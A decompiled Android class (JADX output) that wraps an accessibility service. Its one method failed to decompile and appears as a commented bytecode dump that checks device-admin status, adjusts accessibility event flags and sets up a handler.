package com.acse.ottn.receiver;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.admin.DevicePolicyManager;
import android.os.Handler;

/* loaded from: E:\TSN-r\205dec\6276784.dex */
public class c {

    /* renamed from: a  reason: collision with root package name */
    private static final String f6218a = "MyAccessibilityService";

    /* renamed from: b  reason: collision with root package name */
    private boolean f6219b;

    /* renamed from: c  reason: collision with root package name */
    public Handler f6220c;

    /* renamed from: d  reason: collision with root package name */
    private AccessibilityService f6221d;

    /* renamed from: e  reason: collision with root package name */
    private AccessibilityServiceInfo f6222e;

    /* renamed from: f  reason: collision with root package name */
    private DevicePolicyManager f6223f;

    /* renamed from: g  reason: collision with root package name */
    private h f6224g;

    public c(AccessibilityService accessibilityService) {
        this.f6221d = accessibilityService;
    }

    /* JADX WARN: Removed duplicated region for block: B:13:0x004a A[Catch: all -> 0x0063, TryCatch #0 {all -> 0x0063, blocks: (B:2:0x0000, B:4:0x0004, B:6:0x0023, B:11:0x0038, B:13:0x004a, B:14:0x004f), top: B:19:0x0000 }] */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct code enable 'Show inconsistent code' option in preferences
    */
    public void a() {
        /*
            r4 = this;
            android.accessibilityservice.AccessibilityService r0 = r4.f6221d     // Catch: java.lang.Throwable -> L63
            java.lang.String r1 = "device_policy"
            java.lang.Object r0 = r0.getSystemService(r1)     // Catch: java.lang.Throwable -> L63
            android.app.admin.DevicePolicyManager r0 = (android.app.admin.DevicePolicyManager) r0     // Catch: java.lang.Throwable -> L63
            r4.f6223f = r0     // Catch: java.lang.Throwable -> L63
            android.accessibilityservice.AccessibilityService r0 = r4.f6221d     // Catch: java.lang.Throwable -> L63
            android.accessibilityservice.AccessibilityServiceInfo r0 = r0.getServiceInfo()     // Catch: java.lang.Throwable -> L63
            r4.f6222e = r0     // Catch: java.lang.Throwable -> L63
            com.acse.ottn.receiver.h r0 = new com.acse.ottn.receiver.h     // Catch: java.lang.Throwable -> L63
            android.accessibilityservice.AccessibilityService r1 = r4.f6221d     // Catch: java.lang.Throwable -> L63
            r0.<init>(r1)     // Catch: java.lang.Throwable -> L63
            r4.f6224g = r0     // Catch: java.lang.Throwable -> L63
            int r0 = android.os.Build.VERSION.SDK_INT     // Catch: java.lang.Throwable -> L63
            r1 = 28
            if (r0 >= r1) goto L37
            android.app.admin.DevicePolicyManager r0 = r4.f6223f     // Catch: java.lang.Throwable -> L63
            android.content.ComponentName r1 = new android.content.ComponentName     // Catch: java.lang.Throwable -> L63
            android.accessibilityservice.AccessibilityService r2 = r4.f6221d     // Catch: java.lang.Throwable -> L63
            java.lang.Class<com.acse.ottn.receiver.d> r3 = com.acse.ottn.receiver.d.class
            r1.<init>(r2, r3)     // Catch: java.lang.Throwable -> L63
            boolean r0 = r0.isAdminActive(r1)     // Catch: java.lang.Throwable -> L63
            if (r0 == 0) goto L35
            goto L37
        L35:
            r0 = 0
            goto L38
        L37:
            r0 = 1
        L38:
            r4.f6219b = r0     // Catch: java.lang.Throwable -> L63
            android.accessibilityservice.AccessibilityServiceInfo r1 = r4.f6222e     // Catch: java.lang.Throwable -> L63
            int r2 = r1.eventTypes     // Catch: java.lang.Throwable -> L63
            r2 = r2 | 32
            r1.eventTypes = r2     // Catch: java.lang.Throwable -> L63
            int r2 = r1.flags     // Catch: java.lang.Throwable -> L63
            r2 = r2 | 32
            r1.flags = r2     // Catch: java.lang.Throwable -> L63
            if (r0 == 0) goto L4f
            com.acse.ottn.receiver.h r0 = r4.f6224g     // Catch: java.lang.Throwable -> L63
            r0.a()     // Catch: java.lang.Throwable -> L63
        L4f:
            android.accessibilityservice.AccessibilityService r0 = r4.f6221d     // Catch: java.lang.Throwable -> L63
            android.accessibilityservice.AccessibilityServiceInfo r1 = r4.f6222e     // Catch: java.lang.Throwable -> L63
            r0.setServiceInfo(r1)     // Catch: java.lang.Throwable -> L63
            android.os.Handler r0 = new android.os.Handler     // Catch: java.lang.Throwable -> L63
            com.acse.ottn.receiver.b r1 = new com.acse.ottn.receiver.b     // Catch: java.lang.Throwable -> L63
            r1.<init>(r4)     // Catch: java.lang.Throwable -> L63
            r0.<init>(r1)     // Catch: java.lang.Throwable -> L63
            r4.f6220c = r0     // Catch: java.lang.Throwable -> L63
            goto L67
        L63:
            r0 = move-exception
            r0.printStackTrace()
        L67:
            return
        */
        throw new UnsupportedOperationException("Method not decompiled: com.acse.ottn.receiver.c.a():void");
    }
}
